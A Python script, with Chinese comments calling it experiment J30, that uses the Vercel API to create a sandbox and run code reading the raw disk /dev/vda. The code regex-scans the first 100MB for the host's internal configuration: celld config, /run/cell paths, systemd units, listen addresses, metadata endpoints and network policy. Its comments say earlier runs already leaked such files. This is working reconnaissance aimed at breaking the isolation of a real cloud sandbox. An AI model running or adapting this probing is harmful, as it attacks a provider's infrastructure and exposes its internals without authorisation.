# 实验J30: vda 0-100MB 精准扫描(快速, 亚秒读取) 提取 celld 配置
# 依据: J26首版 0.1GB 命中 celld.toml 目录块; mountinfo 泄露 /run/cell/ 目录
# PAT 精准: TOML/systemd/celld 特征, 带绝对偏移+上下文
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj30"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import re, time
t0 = time.time()
LIMIT = 100 * 1024 * 1024  # 0-100MB
pat = re.compile(rb"(celld|xkernel|/opt/vercel|/run/cell|ExecStart|journald|Type=simple|\.toml|\.service|bind\s*=\s*[\"']|listen\s*=\s*[\"']|addr\s*=\s*[\"']|port\s*=\s*[0-9]|socket\s*=\s*[\"']|endpoint\s*=\s*[\"']|api_version|network_policy|sandbox_ctl|imds|metadata_|(^|\s)#\s*[A-Za-z_]{4,})", re.M)
hits = []
CH = 256 * 1024
with open("/dev/vda", "rb", buffering=0) as f:
    off = 0
    while off < LIMIT:
        n = min(CH, LIMIT - off)
        chunk = f.read(n)
        if not chunk:
            break
        for m in pat.finditer(chunk):
            rel = off + m.start()
            hits.append(rel)
        off += n
print("scan 0-100MB done in %.2fs, hits: %d" % (time.time()-t0, len(hits)), flush=True)
# 打印每个命中偏移 + 上下文(去重, 合并相近)
hits = sorted(set(hits))
merged = []
for h in hits:
    if merged and h - merged[-1] < 4096:
        merged[-1] = h
    else:
        merged.append(h)
print("merged:", len(merged), flush=True)
with open("/dev/vda", "rb", buffering=0) as f:
    for h in merged[:40]:
        f.seek(max(0, h - 128))
        ctx = f.read(768)
        lines = ctx.decode(errors="replace").split("\n")
        lines = [l for l in lines if l.strip()]
        keep = []
        for l in lines:
            if pat.search(l.encode(errors="replace")):
                keep.append(l.strip())
        if not keep:
            keep = [lines[0].strip()] if lines else [""]
        print("OFF=%d (%d MB)" % (h, h // (1024*1024)), flush=True)
        for l in keep[:6]:
            print("   ", l[:200], flush=True)
'''
run_cmd(sid, SCAN, "scan", wait=True, timeout=90000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
